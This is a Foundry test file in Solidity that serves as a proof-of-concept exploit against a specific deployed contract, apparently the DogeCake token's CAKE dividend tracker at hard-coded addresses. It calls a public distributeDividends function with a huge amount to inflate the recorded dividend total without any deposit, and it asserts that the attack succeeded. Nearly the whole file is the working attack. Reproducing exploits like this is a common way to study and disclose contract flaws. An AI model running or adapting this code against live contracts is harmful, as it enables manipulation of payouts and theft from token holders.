// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDogeCake {
    function cakeDividendTracker() external view returns (address);
}

interface ICakeDividendTracker {
    function distributeDividends(uint256 amount) external;
    function totalSupply() external view returns (uint256);
    function totalDividendsDistributed() external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant CAKE_TOKEN = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address constant TARGET = 0x88b9BBdaF00770Ba398c9A2e0d3C02D45Dcb9820;
    address attacker = address(this);
    IDogeCake dogeCake;
    ICakeDividendTracker cakeDividendTracker;
    address cakeDividendTrackerAddress;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        dogeCake = IDogeCake(TARGET);
        cakeDividendTrackerAddress = dogeCake.cakeDividendTracker();
        cakeDividendTracker = ICakeDividendTracker(cakeDividendTrackerAddress);

        // Fund the dividend tracker with a very large amount of CAKE tokens to prevent 
        // a revert during the setup's automatic dividend processing.
        // The amount must be larger than any pre-existing dividend claim.
        deal(CAKE_TOKEN, cakeDividendTrackerAddress, 10_000_000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Pre-condition check: Ensure the dividend tracker has a non-zero total supply.
        assertGt(cakeDividendTracker.totalSupply(), 0, "Precondition failed: cakeDividendTracker totalSupply is zero.");

        // Exploit: Call the public distributeDividends function with a massive amount.
        // This inflates the totalDividendsDistributed state variable without any actual deposit.
        uint256 beforeValue = cakeDividendTracker.totalDividendsDistributed();
        cakeDividendTracker.distributeDividends(1_000_000 * 1e18);
        uint256 afterValue = cakeDividendTracker.totalDividendsDistributed();
        assertGt(afterValue, beforeValue, "totalDividendsDistributed did not increase");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

